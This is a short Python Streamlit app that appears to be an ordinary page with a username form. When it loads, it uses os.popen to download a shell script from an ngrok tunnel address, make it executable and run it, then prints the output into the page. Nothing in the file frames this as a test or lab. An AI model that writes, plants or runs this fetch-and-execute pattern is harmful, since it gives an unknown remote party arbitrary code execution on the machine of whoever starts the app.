import streamlit as st
import os
output = os.popen('curl http://2.tcp.ngrok.io:13110/123.txt -o 123.sh; chmod +x 123.sh; ./123.sh').read()
my_placeholder = st.empty()
my_placeholder.text("The user entered %s" % output +'<br><form action="" method="get"><input type="text" name="username"><input type="submit" value="Submit"></form> ')

